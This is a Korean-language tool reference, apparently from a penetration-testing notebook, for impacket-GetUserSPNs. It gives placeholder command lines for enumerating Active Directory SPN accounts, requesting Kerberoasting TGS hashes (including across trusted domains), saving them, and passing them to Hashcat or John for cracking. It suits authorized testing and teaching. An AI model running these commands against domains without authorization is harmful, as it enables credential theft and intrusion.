---
tags:
  - 환경/ad
  - 서비스/kerberos
  - 기능/자격증명수집
실행환경: ["Linux"]
필요조건: ["도메인 인증 정보 또는 티켓"]
결과: ["Kerberos hash", "SPN 목록"]
---

# impacket-GetUserSPNs

## 도구 개요

`impacket-GetUserSPNs`는 AD에서 Service Principal Name(SPN)이 설정된 사용자 계정을 열거하고 해당 계정의 TGS hash를 요청한다. Linux에서 Kerberoasting 대상을 선별하고 오프라인 비밀번호 복구용 자료를 수집할 때 사용한다.

## 필요한 입력과 실행 환경

- 실행 위치: DC의 LDAP와 Kerberos에 접근 가능한 Linux 호스트
- 필요한 입력: 도메인 credential 또는 `KRB5CCNAME` ticket, DC 주소/FQDN
- hash 요청 입력: `-request`와 필요하면 특정 사용자, 출력 파일 및 cracking format


## 표준 사용법

```bash
impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request
```

## 대표 예시

### TGS를 요청하지 않고 SPN 계정만 열거

```bash
impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
```

확인할 출력:

- `ServicePrincipalName`, `Name`, `MemberOf`, `PasswordLastSet`, `LastLogon`.
- `$krb5tgs$`가 없으면 SPN 계정 열거까지만 수행한 상태다.

### credential로 Kerberoasting hash 수집

```bash
impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <TARGET> -request -outputfile kerberoast.hashes
```

### Kerberos ccache로 SPN/TGS 요청

```bash
export KRB5CCNAME=<CCACHE_FILE>
impacket-GetUserSPNs -k -no-pass -dc-ip <TARGET> '<DOMAIN>/<USER>'
```

### 신뢰 대상 도메인의 SPN과 TGS hash 수집

```bash
impacket-GetUserSPNs -target-domain <TARGET_TRUST_DOMAIN> '<SOURCE_DOMAIN>/<USER>:<PASSWORD>'
impacket-GetUserSPNs -request -target-domain <TARGET_TRUST_DOMAIN> '<SOURCE_DOMAIN>/<USER>:<PASSWORD>' -outputfile trusted-domain-kerberoast.hashes
```

확인할 출력:

- SPN 목록과 `$krb5tgs$` hash의 realm이 `<TARGET_TRUST_DOMAIN>`에 속하는지 확인한다.
- `<USER>`는 현재 인증에 사용할 source domain 계정이며, 출력된 SPN 계정과 구분한다.

## 주요 옵션

| 옵션 | 설명 |
|---|---|
| `-request` | SPN 계정의 TGS hash 요청 |
| `-outputfile` | hash 결과 저장 |
| `-dc-ip` | 도메인 컨트롤러 IP 지정 |
| `-k` | Kerberos 인증 사용 |
| `-no-pass` | 비밀번호 없이 ccache 사용 |
| `-target-domain` | 신뢰 관계 등 별도 대상 도메인 지정 |

## 도구 고유 출력

| 출력/상태 | 의미 | 다음 행동 |
|---|---|---|
| SPN 목록 | Kerberoasting 후보 존재 | 계정 권한/서비스명 우선순위 선정 |
| `$krb5tgs$` hash | Kerberoasting hash 확보 | Hashcat/John으로 cracking |
| LDAP bind 실패 | credential/ticket 문제 | 인증 방식, 도메인, 시간 확인 |
| SPN 없음 | roast 후보 없음 | 다른 도메인, 서비스, LDAP 필터 확인 |
| hash 요청 실패 | SPN/권한/암호화 조건 문제 | SPN 형식, 계정 상태, 도구 버전 확인 |

## 관련 공격기법

- [[SPN 계정 열거]]
- [[Kerberoasting]]
